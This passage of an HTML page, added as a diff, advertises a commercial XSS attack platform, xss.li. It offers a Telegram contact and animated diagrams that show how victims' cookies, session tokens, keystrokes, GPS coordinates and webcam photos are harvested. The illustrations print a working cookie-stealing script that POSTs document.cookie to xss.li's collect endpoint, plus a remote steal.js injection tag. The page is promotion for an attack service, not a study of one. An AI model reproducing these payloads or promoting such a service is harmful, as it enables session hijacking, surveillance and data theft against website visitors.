+    <!-- 右下角浮动按钮 -->
+    <div class="floating-actions">
+        <!-- Telegram联系按钮 -->
+        <a href="https://t.me/hackhub7" target="_blank" rel="noopener noreferrer" class="float-btn telegram-btn" title="Telegram联系">
+            <svg width="20" height="20" viewBox="0 0 496 512" fill="currentColor" style="display: inline-block;">
+                <path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/>
+            </svg>
+        </a>
+        <!-- 回到顶部按钮 -->
+        <div class="float-btn back-to-top" id="backToTop" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </div>
+    </div>
+    
+    <!-- Hero Section -->
+    <section class="hero-section" itemscope itemtype="https://schema.org/WebPage">
+        <div class="hero-content">
+            <h1 class="hero-title" itemprop="name">蓝莲花XSS在线平台</h1>
+            <p class="hero-subtitle" itemprop="description">全网功能最强大的XSS系统包含知识库Payload调试</p>
+            
+            <!-- 终端演示 -->
+            <div class="terminal-demo">
+                <div class="terminal-header">
+                    <div class="terminal-btn red"></div>
+                    <div class="terminal-btn yellow"></div>
+                    <div class="terminal-btn green"></div>
+                </div>
+                <div class="typing-text" id="terminal-text"></div>
+            </div>
+            
+            <!-- 向下滚动指示器 -->
+            <div class="scroll-indicator" onclick="scrollToSection('stats')">
+                <div class="mouse">
+                    <div class="wheel"></div>
+                </div>
+                <div class="text">Scroll Down</div>
+                <div class="arrow">↓</div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- 统计数据 -->
+    <section class="py-5" id="stats" style="background: rgba(0, 0, 0, 0.3);">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3">
+                    <div class="stats-counter">
+                        <div class="counter-value" data-target="6598">0</div>
+                        <div class="counter-label">XSS请求提交</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-counter">
+                        <div class="counter-value" data-target="856">0</div>
+                        <div class="counter-label">活跃用户</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-counter">
+                        <div class="counter-value" data-target="69">0</div>
+                        <div class="counter-label">Payload(每周更新)</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-counter">
+                        <div class="counter-value" data-target="100">0</div>
+                        <div class="counter-label">平台稳定性</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- 图片展示板块 -->
+    <section class="py-5 gallery-section" style="background: rgba(0, 0, 0, 0.3);">
+        <div class="container">
+            <h2 class="section-title">平台界面展示</h2>
+            <div class="row g-4">
+                <div class="col-md-3 col-sm-6">
+                    <div class="gallery-item">
+                        <img src="tu/xss1.png" alt="XSS平台控制台界面" class="gallery-image">
+                        <div class="gallery-overlay">
+                            <div class="overlay-content">
+                                <i class="fas fa-search-plus"></i>
+                                <p>控制台界面</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6">
+                    <div class="gallery-item">
+                        <img src="tu/xss2.png" alt="XSS平台日志分析" class="gallery-image">
+                        <div class="gallery-overlay">
+                            <div class="overlay-content">
+                                <i class="fas fa-search-plus"></i>
+                                <p>日志分析</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6">
+                    <div class="gallery-item">
+                        <img src="tu/xss3.png" alt="XSS平台Payload管理" class="gallery-image">
+                        <div class="gallery-overlay">
+                            <div class="overlay-content">
+                                <i class="fas fa-search-plus"></i>
+                                <p>Payload管理</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6">
+                    <div class="gallery-item">
+                        <img src="tu/xss4.png" alt="XSS平台配置中心" class="gallery-image">
+                        <div class="gallery-overlay">
+                            <div class="overlay-content">
+                                <i class="fas fa-search-plus"></i>
+                                <p>配置中心</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+ 
+    
+    <!-- 平台优势 -->
+
+    
+    <!-- 核心功能演示 -->
+    <section id="features-demo" style="padding: 5rem 0; position: relative; z-index: 10;">
+        <div class="container">
+            <h2 class="section-title">核心功能演示</h2>
+            <!-- 插图1: XSS攻击流程 -->
+            <div class="illustration-box">
+                <h3 class="illustration-title">XSS攻击数据流转过程</h3>
+                <svg width="100%" height="300" viewBox="0 0 1000 300" style="background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1a 50%, #0a1a0a 100%); border-radius: 8px;">
+                    <!-- 赛博背景效果 -->
+                    <defs>
+                        <radialGradient id="cyberGlow" cx="50%" cy="50%" r="50%">
+                            <stop offset="0%" style="stop-color:#00ff41;stop-opacity:0.15"/>
+                            <stop offset="100%" style="stop-color:#00ff41;stop-opacity:0"/>
+                        </radialGradient>
+                        <linearGradient id="scanLine" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" style="stop-color:#00ff41;stop-opacity:0"/>
+                            <stop offset="50%" style="stop-color:#00ff41;stop-opacity:0.3"/>
+                            <stop offset="100%" style="stop-color:#00ff41;stop-opacity:0"/>
+                        </linearGradient>
+                    </defs>
+                    <!-- 背景光晕 -->
+                    <circle cx="200" cy="150" r="150" fill="url(#cyberGlow)" opacity="0.4"/>
+                    <circle cx="800" cy="150" r="150" fill="url(#cyberGlow)" opacity="0.4"/>
+                    <!-- 扫描线效果 -->
+                    <rect x="0" y="0" width="1000" height="2" fill="url(#scanLine)">
+                        <animate attributeName="y" from="0" to="300" dur="3s" repeatCount="indefinite"/>
+                    </rect>
+                    <!-- 攻击者 -->
+                    <rect x="50" y="100" width="120" height="100" fill="#1a1f3a" stroke="#00ff41" stroke-width="2" rx="8"/>
+                    <text x="110" y="140" text-anchor="middle" fill="#00ff41" font-size="14" font-weight="bold">攻击者</text>
+                    <text x="110" y="160" text-anchor="middle" fill="#888" font-size="11">注入Payload</text>
+                    <circle cx="110" cy="90" r="15" fill="#00ff41" opacity="0.3"/>
+                    <path d="M 110 80 Q 110 75, 105 75 L 105 85 M 110 75 L 115 85 L 105 85" fill="#00ff41"/>
+                    
+                    <!-- 箭头1 -->
+                    <defs>
+                        <marker id="arrowhead" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <polygon points="0 0, 10 3, 0 6" fill="#00ff41"/>
+                        </marker>
+                    </defs>
+                    <path d="M 170 150 L 280 150" stroke="#00ff41" stroke-width="3" marker-end="url(#arrowhead)" stroke-dasharray="5,5">
+                        <animate attributeName="stroke-dashoffset" from="0" to="10" dur="1s" repeatCount="indefinite"/>
+                    </path>
+                    <text x="225" y="140" text-anchor="middle" fill="#0ff" font-size="10">XSS代码</text>
+                    
+                    <!-- 目标网站 -->
+                    <rect x="280" y="100" width="140" height="100" fill="#1a1f3a" stroke="#ff0040" stroke-width="2" rx="8"/>
+                    <text x="350" y="140" text-anchor="middle" fill="#ff0040" font-size="14" font-weight="bold">目标网站</text>
+                    <text x="350" y="160" text-anchor="middle" fill="#888" font-size="11">存储/执行</text>
+                    <rect x="300" y="120" width="100" height="5" fill="#ff0040" opacity="0.5" rx="2"/>
+                    <rect x="300" y="135" width="80" height="5" fill="#ff0040" opacity="0.3" rx="2"/>
+                    
+                    <!-- 箭头2 -->
+                    <path d="M 420 150 L 530 150" stroke="#00d4ff" stroke-width="3" marker-end="url(#arrowhead)" stroke-dasharray="5,5">
+                        <animate attributeName="stroke-dashoffset" from="0" to="10" dur="1s" repeatCount="indefinite"/>
+                    </path>
+                    <text x="475" y="140" text-anchor="middle" fill="#0ff" font-size="10">触发执行</text>
+                    
+                    <!-- 受害者 -->
+                    <rect x="530" y="100" width="120" height="100" fill="#1a1f3a" stroke="#ff6600" stroke-width="2" rx="8"/>
+                    <text x="590" y="140" text-anchor="middle" fill="#ff6600" font-size="14" font-weight="bold">受害者</text>
+                    <text x="590" y="160" text-anchor="middle" fill="#888" font-size="11">浏览器执行</text>
+                    <circle cx="590" cy="90" r="15" fill="#ff6600" opacity="0.3"/>
+                    <path d="M 590 80 Q 590 75, 585 75 L 585 85 M 590 75 L 595 85 L 585 85" fill="#ff6600"/>
+                    
+                    <!-- 箭头3 -->
+                    <path d="M 590 200 Q 590 250, 770 250 L 770 200" stroke="#00ff41" stroke-width="3" marker-end="url(#arrowhead)" stroke-dasharray="5,5">
+                        <animate attributeName="stroke-dashoffset" from="0" to="10" dur="1s" repeatCount="indefinite"/>
+                    </path>
+                    <text x="680" y="270" text-anchor="middle" fill="#0ff" font-size="10">数据回传</text>
+                    
+                    <!-- XSS平台 -->
+                    <rect x="710" y="100" width="240" height="100" fill="#1a1f3a" stroke="#00ff41" stroke-width="3" rx="8"/>
+                    <text x="830" y="130" text-anchor="middle" fill="#00ff41" font-size="16" font-weight="bold">XSS.li平台</text>
+                    <text x="830" y="150" text-anchor="middle" fill="#0ff" font-size="11">实时接收数据</text>
+                    <text x="830" y="170" text-anchor="middle" fill="#888" font-size="10">Cookie | 键盘 | GPS...</text>
+                    <rect x="730" y="180" width="200" height="3" fill="#00ff41" opacity="0.8" rx="1">
+                        <animate attributeName="width" from="0" to="200" dur="2s" repeatCount="indefinite"/>
+                    </rect>
+                </svg>
+                <p style="text-align: center; color: var(--text-secondary); margin-top: 15px;">攻击者注入XSS代码 → 存储到目标网站 → 受害者触发执行 → 数据回传到XSS平台</p>
+            </div>
+
+               <div class="row mt-5">
+                <div class="col-md-6">
+                    <div class="illustration-box">
+                        <h3 class="illustration-title">📊 实时监控后台</h3>
+                        <svg width="100%" height="250" viewBox="0 0 500 250" style="background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0a 100%); border-radius: 8px;">
+                            <!-- 矩阵背景 -->
+                            <defs>
+                                <pattern id="matrix" x="0" y="0" width="20" height="20" patternUnits="userSpaceOnUse">
+                                    <text x="5" y="15" fill="#00ff41" opacity="0.1" font-size="10" font-family="monospace">0</text>
+                                </pattern>
+                            </defs>
+                            <rect width="500" height="250" fill="url(#matrix)"/>
+                            <!-- 浏览器窗口 -->
+                            <rect x="20" y="20" width="460" height="210" fill="#1a1f3a" stroke="#00ff41" stroke-width="2" rx="5"/>
+                            <!-- 标题栏 -->
+                            <rect x="20" y="20" width="460" height="30" fill="#00ff41" rx="5 5 0 0"/>
+                            <circle cx="35" cy="35" r="5" fill="#000"/>
+                            <circle cx="50" cy="35" r="5" fill="#000"/>
+                            <circle cx="65" cy="35" r="5" fill="#000"/>
+                            <text x="240" y="40" text-anchor="middle" fill="#000" font-size="12" font-weight="bold">XSS管理后台</text>
+                            
+                            <!-- 顶部导航 -->
+                            <rect x="30" y="60" width="440" height="25" fill="#0a0e27" rx="3"/>
+                            <text x="45" y="77" fill="#00ff41" font-size="11">📈 Dashboard</text>
+                            <text x="150" y="77" fill="#888" font-size="11">📋 Logs</text>
+                            <text x="230" y="77" fill="#888" font-size="11">📝 Templates</text>
+                            <text x="340" y="77" fill="#888" font-size="11">👥 Users</text>
+                            
+                            <!-- 统计卡片 -->
+                            <rect x="35" y="95" width="100" height="60" fill="rgba(0,255,65,0.1)" stroke="#00ff41" stroke-width="1" rx="5"/>
+                            <text x="85" y="115" text-anchor="middle" fill="#00ff41" font-size="20" font-weight="bold">1,234</text>
+                            <text x="85" y="135" text-anchor="middle" fill="#888" font-size="10">总日志数</text>
+                            
+                            <rect x="145" y="95" width="100" height="60" fill="rgba(0,212,255,0.1)" stroke="#00d4ff" stroke-width="1" rx="5"/>
+                            <text x="195" y="115" text-anchor="middle" fill="#00d4ff" font-size="20" font-weight="bold">56</text>
+                            <text x="195" y="135" text-anchor="middle" fill="#888" font-size="10">今日日志</text>
+                            
+                            <rect x="255" y="95" width="100" height="60" fill="rgba(255,102,0,0.1)" stroke="#ff6600" stroke-width="1" rx="5"/>
+                            <text x="305" y="115" text-anchor="middle" fill="#ff6600" font-size="20" font-weight="bold">89</text>
+                            <text x="305" y="135" text-anchor="middle" fill="#888" font-size="10">独立IP</text>
+                            
+                            <rect x="365" y="95" width="100" height="60" fill="rgba(255,0,64,0.1)" stroke="#ff0040" stroke-width="1" rx="5"/>
+                            <text x="415" y="115" text-anchor="middle" fill="#ff0040" font-size="20" font-weight="bold">12</text>
+                            <text x="415" y="135" text-anchor="middle" fill="#888" font-size="10">在线用户</text>
+                            
+                            <!-- 实时图表 -->
+                            <text x="35" y="175" fill="#00ff41" font-size="11">📈 实时流量趋势</text>
+                            <polyline points="35,210 80,195 125,200 170,185 215,190 260,180 305,195 350,175 395,185 440,170" 
+                                      fill="none" stroke="#00ff41" stroke-width="2" opacity="0.8"/>
+                            <polyline points="35,210 80,195 125,200 170,185 215,190 260,180 305,195 350,175 395,185 440,170" 
+                                      fill="url(#grad1)" opacity="0.3"/>
+                            <defs>
+                                <linearGradient id="grad1" x1="0%" y1="0%" x2="0%" y2="100%">
+                                    <stop offset="0%" style="stop-color:#00ff41;stop-opacity:0.6"/>
+                                    <stop offset="100%" style="stop-color:#00ff41;stop-opacity:0"/>
+                                </linearGradient>
+                            </defs>
+                        </svg>
+                        <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">实时统计面板：日志数、IP数、在线用户、流量趋势一目了然</p>
+                    </div>
+                </div>
+                
+                <!-- 插图3: Payload注入场景 -->
+                <div class="col-md-6">
+                    <div class="illustration-box">
+                        <h3 class="illustration-title">💉 Payload注入示例</h3>
+                        <svg width="100%" height="250" viewBox="0 0 500 250" style="background: linear-gradient(to bottom, #0f0f23 0%, #1a1a2e 50%, #0a0a0a 100%); border-radius: 8px;">
+                            <!-- 代码流光背景 -->
+                            <defs>
+                                <linearGradient id="codeGlow" x1="0%" y1="0%" x2="0%" y2="100%">
+                                    <stop offset="0%" style="stop-color:#00d4ff;stop-opacity:0.1"/>
+                                    <stop offset="100%" style="stop-color:#9d00ff;stop-opacity:0.1"/>
+                                </linearGradient>
+                            </defs>
+                            <rect width="500" height="250" fill="url(#codeGlow)"/>
+                            <!-- 数据粒子 -->
+                            <circle cx="50" cy="30" r="2" fill="#00d4ff" opacity="0.6">
+                                <animate attributeName="cy" from="30" to="220" dur="4s" repeatCount="indefinite"/>
+                                <animate attributeName="opacity" values="0.6;0.2;0.6" dur="4s" repeatCount="indefinite"/>
+                            </circle>
+                            <circle cx="150" cy="80" r="2" fill="#00ff41" opacity="0.6">
+                                <animate attributeName="cy" from="80" to="240" dur="5s" repeatCount="indefinite"/>
+                                <animate attributeName="opacity" values="0.6;0.2;0.6" dur="5s" repeatCount="indefinite"/>
+                            </circle>
+                            <!-- 代码编辑器窗口 -->
+                            <rect x="20" y="20" width="460" height="210" fill="#1a1f3a" stroke="#00d4ff" stroke-width="2" rx="5"/>
+                            <rect x="20" y="20" width="460" height="25" fill="#00d4ff" rx="5 5 0 0"/>
+                            <circle cx="35" cy="32" r="4" fill="#000"/>
+                            <circle cx="48" cy="32" r="4" fill="#000"/>
+                            <circle cx="61" cy="32" r="4" fill="#000"/>
+                            <text x="240" y="38" text-anchor="middle" fill="#000" font-size="11" font-weight="bold">payload.js</text>
+                            
+                            <!-- 行号 -->
+                            <rect x="20" y="45" width="30" height="185" fill="#0a0e27"/>
+                            <text x="35" y="65" text-anchor="middle" fill="#555" font-size="9">1</text>
+                            <text x="35" y="80" text-anchor="middle" fill="#555" font-size="9">2</text>
+                            <text x="35" y="95" text-anchor="middle" fill="#555" font-size="9">3</text>
+                            <text x="35" y="110" text-anchor="middle" fill="#555" font-size="9">4</text>
+                            <text x="35" y="125" text-anchor="middle" fill="#555" font-size="9">5</text>
+                            <text x="35" y="140" text-anchor="middle" fill="#555" font-size="9">6</text>
+                            <text x="35" y="155" text-anchor="middle" fill="#555" font-size="9">7</text>
+                            <text x="35" y="170" text-anchor="middle" fill="#555" font-size="9">8</text>
+                            
+                            <!-- 代码内容 -->
+                            <text x="60" y="65" fill="#ff6600" font-size="10" font-family="monospace">&lt;script&gt;</text>
+                            <text x="60" y="80" fill="#9d00ff" font-size="10" font-family="monospace">  fetch</text>
+                            <text x="100" y="80" fill="#fff" font-size="10" font-family="monospace">(</text>
+                            <text x="105" y="80" fill="#0ff" font-size="10" font-family="monospace">'https://xss.li/api/collect.php'</text>
+                            <text x="310" y="80" fill="#fff" font-size="10" font-family="monospace">,{</text>
+                            
+                            <text x="70" y="95" fill="#888" font-size="10" font-family="monospace">    method:</text>
+                            <text x="130" y="95" fill="#0ff" font-size="10" font-family="monospace">'POST'</text>
+                            <text x="175" y="95" fill="#fff" font-size="10" font-family="monospace">,</text>
+                            
+                            <text x="70" y="110" fill="#888" font-size="10" font-family="monospace">    body:</text>
+                            <text x="118" y="110" fill="#00ff41" font-size="10" font-family="monospace">JSON.stringify</text>
+                            <text x="220" y="110" fill="#fff" font-size="10" font-family="monospace">({</text>
+                            
+                            <text x="80" y="125" fill="#888" font-size="10" font-family="monospace">      cookie:</text>
+                            <text x="145" y="125" fill="#00ff41" font-size="10" font-family="monospace">document.cookie</text>
+                            <text x="245" y="125" fill="#fff" font-size="10" font-family="monospace">,</text>
+                            
+                            <text x="80" y="140" fill="#888" font-size="10" font-family="monospace">      url:</text>
+                            <text x="120" y="140" fill="#00ff41" font-size="10" font-family="monospace">location.href</text>
+                            
+                            <text x="70" y="155" fill="#fff" font-size="10" font-family="monospace">    })</text>
+                            <text x="60" y="170" fill="#fff" font-size="10" font-family="monospace">  });</text>
+                            <text x="60" y="185" fill="#ff6600" font-size="10" font-family="monospace">&lt;/script&gt;</text>
+                            
+                            <!-- 光标 -->
+                            <rect x="145" y="175" width="2" height="12" fill="#00ff41">
+                                <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/>
+                            </rect>
+                            
+                            <!-- 执行提示 -->
+                            <rect x="350" y="190" width="120" height="30" fill="rgba(0,255,65,0.2)" stroke="#00ff41" stroke-width="1" rx="3"/>
+                            <text x="410" y="210" text-anchor="middle" fill="#00ff41" font-size="10">✓ 代码执行成功</text>
+                        </svg>
+                        <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">JavaScript Payload示例：窃取Cookie并发送到服务器</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 插图4: Cookie窃取流程 -->
+            <div class="illustration-box mt-5">
+                <h3 class="illustration-title">🍪 Cookie窃取完整流程</h3>
+                <svg width="100%" height="280" viewBox="0 0 1000 280" style="background: radial-gradient(circle at 30% 50%, #1a0a1a 0%, #0a0a0a 50%, #0a1a1a 100%); border-radius: 8px;">
+                    <!-- 攻击路径光效 -->
+                    <defs>
+                        <linearGradient id="attackPath" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" style="stop-color:#00ff41;stop-opacity:0.3"/>
+                            <stop offset="50%" style="stop-color:#ff0040;stop-opacity:0.3"/>
+                            <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:0.3"/>
+                        </linearGradient>
+                    </defs>
+                    <!-- 背景能量波 -->
+                    <ellipse cx="500" cy="140" rx="400" ry="80" fill="url(#attackPath)" opacity="0.2"/>
+                    <!-- 步骤1: 用户登录 -->
+                    <rect x="30" y="50" width="180" height="180" fill="#1a1f3a" stroke="#00ff41" stroke-width="2" rx="10"/>
+                    <circle cx="120" cy="100" r="30" fill="rgba(0,255,65,0.2)" stroke="#00ff41" stroke-width="2"/>
+                    <path d="M 120 90 Q 120 85, 115 85 L 115 95 M 120 85 L 125 95 L 115 95" fill="#00ff41"/>
+                    <text x="120" y="150" text-anchor="middle" fill="#00ff41" font-size="14" font-weight="bold">步骤1</text>
+                    <text x="120" y="170" text-anchor="middle" fill="#888" font-size="11">用户正常登录</text>
+                    <text x="120" y="190" text-anchor="middle" fill="#0ff" font-size="10">获得session</text>
+                    <rect x="50" y="200" width="140" height="15" fill="rgba(0,255,65,0.1)" rx="3"/>
+                    <text x="120" y="210" text-anchor="middle" fill="#00ff41" font-size="9">session_id=abc123</text>
+                    
+                    <!-- 箭头 -->
+                    <path d="M 210 140 L 270 140" stroke="#00ff41" stroke-width="2" marker-end="url(#arrowhead)"/>
+                    
+                    <!-- 步骤2: XSS注入 -->
+                    <rect x="270" y="50" width="180" height="180" fill="#1a1f3a" stroke="#ff0040" stroke-width="2" rx="10"/>
+                    <text x="360" y="100" text-anchor="middle" fill="#ff0040" font-size="30">&lt;/&gt;</text>
+                    <text x="360" y="130" text-anchor="middle" fill="#ff0040" font-size="14" font-weight="bold">步骤2</text>
+                    <text x="360" y="150" text-anchor="middle" fill="#888" font-size="11">访问含XSS</text>
+                    <text x="360" y="170" text-anchor="middle" fill="#888" font-size="11">的恶意页面</text>
+                    <rect x="290" y="180" width="140" height="40" fill="rgba(255,0,64,0.1)" rx="3"/>
+                    <text x="360" y="195" text-anchor="middle" fill="#ff0040" font-size="9">&lt;script src=</text>
+                    <text x="360" y="210" text-anchor="middle" fill="#0ff" font-size="9">"xss.li/steal.js"</text>
+                    <text x="360" y="223" text-anchor="middle" fill="#ff0040" font-size="9">&gt;&lt;/script&gt;</text>
+                    
+                    <path d="M 450 140 L 510 140" stroke="#ff0040" stroke-width="2" marker-end="url(#arrowhead)"/>
+                    
+                    <!-- 步骤3: Cookie窃取 -->
+                    <rect x="510" y="50" width="180" height="180" fill="#1a1f3a" stroke="#ff6600" stroke-width="2" rx="10"/>
+                    <rect x="530" y="80" width="140" height="80" fill="rgba(255,102,0,0.1)" rx="5"/>
+                    <text x="600" y="105" text-anchor="middle" fill="#ff6600" font-size="11">document.cookie</text>
+                    <text x="600" y="125" text-anchor="middle" fill="#0ff" font-size="9">session_id=abc123</text>
+                    <text x="600" y="140" text-anchor="middle" fill="#0ff" font-size="9">user_id=12345</text>
+                    <text x="600" y="155" text-anchor="middle" fill="#0ff" font-size="9">token=xyz789</text>
+                    <text x="600" y="180" text-anchor="middle" fill="#ff6600" font-size="14" font-weight="bold">步骤3</text>
+                    <text x="600" y="200" text-anchor="middle" fill="#888" font-size="11">JS窃取Cookie</text>
+                    <circle cx="600" cy="215" r="8" fill="#ff6600">
+                        <animate attributeName="r" values="8;12;8" dur="1.5s" repeatCount="indefinite"/>
+                    </circle>
+                    
+                    <path d="M 690 140 L 750 140" stroke="#ff6600" stroke-width="2" marker-end="url(#arrowhead)" stroke-dasharray="5,5">
+                        <animate attributeName="stroke-dashoffset" from="0" to="10" dur="0.5s" repeatCount="indefinite"/>
+                    </path>
+                    
+                    <!-- 步骤4: 数据回传 -->
+                    <rect x="750" y="50" width="220" height="180" fill="#1a1f3a" stroke="#00d4ff" stroke-width="2" rx="10"/>
+                    <rect x="770" y="70" width="180" height="30" fill="rgba(0,212,255,0.2)" rx="3"/>
+                    <text x="860" y="90" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">XSS平台服务器</text>
+                    <rect x="770" y="110" width="180" height="100" fill="rgba(0,212,255,0.05)" rx="3"/>
+                    <text x="780" y="130" fill="#0ff" font-size="9">POST /api/collect.php</text>
+                    <text x="780" y="145" fill="#00ff41" font-size="9">{</text>
+                    <text x="790" y="160" fill="#888" font-size="9">"cookie": "abc123",</text>
+                    <text x="790" y="175" fill="#888" font-size="9">"ip": "192.168.1.1",</text>
+                    <text x="790" y="190" fill="#888" font-size="9">"time": "2024-01-01"</text>
+                    <text x="780" y="205" fill="#00ff41" font-size="9">}</text>
+                    <circle cx="940" cy="190" r="6" fill="#00ff41">
+                        <animate attributeName="opacity" values="1;0.3;1" dur="1s" repeatCount="indefinite"/>
+                    </circle>
+                </svg>
+                <p style="text-align: center; color: var(--text-secondary); margin-top: 15px;">完整攻击链：用户登录获得Session → 访问恶意页面 → JavaScript窃取Cookie → 数据发送到XSS平台</p>
+            </div>
+            
+            <!-- 插图5: GPS定位功能 -->
+            <div class="row mt-5">
+                <div class="col-md-6">
+                    <div class="illustration-box">
+                        <h3 class="illustration-title">📍 GPS定位追踪</h3>
+                        <svg width="100%" height="280" viewBox="0 0 500 280" style="background: linear-gradient(135deg, #0a0a1a 0%, #0f1a1f 50%, #0a0a0a 100%); border-radius: 8px;">
+                            <!-- 雷达扫描背景 -->
+                            <defs>
+                                <radialGradient id="radarScan" cx="50%" cy="50%" r="50%">
+                                    <stop offset="0%" style="stop-color:#00d4ff;stop-opacity:0.2"/>
+                                    <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:0"/>
+                                </radialGradient>
+                            </defs>
+                            <circle cx="250" cy="140" r="150" fill="url(#radarScan)">
+                                <animate attributeName="r" values="50;200;50" dur="4s" repeatCount="indefinite"/>
+                            </circle>
+                            <!-- 地图背景 -->
+                            <rect x="20" y="20" width="460" height="240" fill="#1a1f3a" stroke="#00d4ff" stroke-width="2" rx="8"/>
+                            <!-- 网格 -->
+                            <line x1="20" y1="80" x2="480" y2="80" stroke="#333" stroke-width="1"/>
+                            <line x1="20" y1="140" x2="480" y2="140" stroke="#333" stroke-width="1"/>
+                            <line x1="20" y1="200" x2="480" y2="200" stroke="#333" stroke-width="1"/>
+                            <line x1="140" y1="20" x2="140" y2="260" stroke="#333" stroke-width="1"/>
+                            <line x1="260" y1="20" x2="260" y2="260" stroke="#333" stroke-width="1"/>
+                            <line x1="380" y1="20" x2="380" y2="260" stroke="#333" stroke-width="1"/>
+                            
+                            <!-- 坐标轴标签 -->
+                            <text x="30" y="40" fill="#666" font-size="9">N</text>
+                            <text x="465" y="250" fill="#666" font-size="9">E</text>
+                            
+                            <!-- GPS定位点 -->
+                            <circle cx="320" cy="150" r="8" fill="#ff0040" stroke="#ff0040" stroke-width="2">
+                                <animate attributeName="r" values="8;12;8" dur="2s" repeatCount="indefinite"/>
+                            </circle>
+                            <!-- 波纹效果 -->
+                            <circle cx="320" cy="150" r="15" fill="none" stroke="#ff0040" stroke-width="2" opacity="0.6">
+                                <animate attributeName="r" values="15;35;55" dur="2s" repeatCount="indefinite"/>
+                                <animate attributeName="opacity" values="0.6;0.3;0" dur="2s" repeatCount="indefinite"/>
+                            </circle>
+                            <circle cx="320" cy="150" r="30" fill="none" stroke="#ff0040" stroke-width="2" opacity="0.4">
+                                <animate attributeName="r" values="15;35;55" begin="0.7s" dur="2s" repeatCount="indefinite"/>
+                                <animate attributeName="opacity" values="0.6;0.3;0" begin="0.7s" dur="2s" repeatCount="indefinite"/>
+                            </circle>
+                            
+                            <!-- 信息框 -->
+                            <rect x="340" y="120" width="130" height="80" fill="rgba(0,0,0,0.9)" stroke="#00ff41" stroke-width="2" rx="5"/>
+                            <text x="350" y="140" fill="#00ff41" font-size="11" font-weight="bold">📍 定位信息</text>
+                            <text x="350" y="158" fill="#0ff" font-size="9">经度: 116.404</text>
+                            <text x="350" y="172" fill="#0ff" font-size="9">纬度: 39.915</text>
+                            <text x="350" y="186" fill="#888" font-size="9">精度: ±50m</text>
+                            <text x="350" y="200" fill="#ff6600" font-size="9">⏰ 2024-01-01 12:00</text>
+                            
+                            <!-- 地标 -->
+                            <path d="M 150 100 L 155 90 L 160 100 L 155 95 Z" fill="#00ff41"/>
+                            <text x="145" y="85" fill="#00ff41" font-size="8">地标A</text>
+                            
+                            <rect x="380" y="210" width="10" height="15" fill="#00d4ff"/>
+                            <path d="M 375 210 L 385 200 L 395 210 Z" fill="#00d4ff"/>
+                            <text x="375" y="235" fill="#00d4ff" font-size="8">建筑</text>
+                        </svg>
+                        <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">通过浏览器Geolocation API获取用户精确GPS坐标</p>
+                    </div>
+                </div>
+                
+                <!-- 插图6: 摄像头监控 -->
+                <div class="col-md-6">
+                    <div class="illustration-box">
+                        <h3 class="illustration-title">📷 摄像头远程拍照</h3>
+                        <svg width="100%" height="280" viewBox="0 0 500 280" style="background: radial-gradient(ellipse at center, #1a0f0a 0%, #0a0a0a 100%); border-radius: 8px;">
+                            <!-- 摄像头监控光束 -->
+                            <defs>
+                                <radialGradient id="cameraBeam" cx="50%" cy="30%" r="70%">
+                                    <stop offset="0%" style="stop-color:#ff6600;stop-opacity:0.2"/>
+                                    <stop offset="100%" style="stop-color:#ff6600;stop-opacity:0"/>
+                                </radialGradient>
+                            </defs>
+                            <ellipse cx="250" cy="100" rx="200" ry="150" fill="url(#cameraBeam)"/>
+                            <!-- 浏览器窗口 -->
+                            <rect x="50" y="30" width="400" height="220" fill="#1a1f3a" stroke="#ff6600" stroke-width="2" rx="8"/>
+                            <rect x="50" y="30" width="400" height="25" fill="#ff6600" rx="8 8 0 0"/>
+                            <circle cx="65" cy="42" r="4" fill="#000"/>
+                            <circle cx="78" cy="42" r="4" fill="#000"/>
+                            <circle cx="91" cy="42" r="4" fill="#000"/>
+                            <text x="250" y="47" text-anchor="middle" fill="#000" font-size="11" font-weight="bold">用户摄像头</text>
+                            
+                            <!-- 摄像头画面 -->
+                            <rect x="70" y="70" width="360" height="160" fill="#000" rx="5"/>
+                            <!-- 模拟人脸 -->
+                            <circle cx="250" cy="130" r="40" fill="#2a2f4a" stroke="#00ff41" stroke-width="2"/>
+                            <circle cx="235" cy="120" r="5" fill="#00ff41"/>
+                            <circle cx="265" cy="120" r="5" fill="#00ff41"/>
+                            <path d="M 235 145 Q 250 155, 265 145" fill="none" stroke="#00ff41" stroke-width="2"/>
+                            
+                            <!-- 扫描线 -->
+                            <rect x="70" y="130" width="360" height="2" fill="#00ff41" opacity="0.6">
+                                <animate attributeName="y" from="70" to="230" dur="2s" repeatCount="indefinite"/>
+                            </rect>
+                            
+                            <!-- 拍照指示器 -->
+                            <circle cx="415" cy="80" r="6" fill="#ff0040">
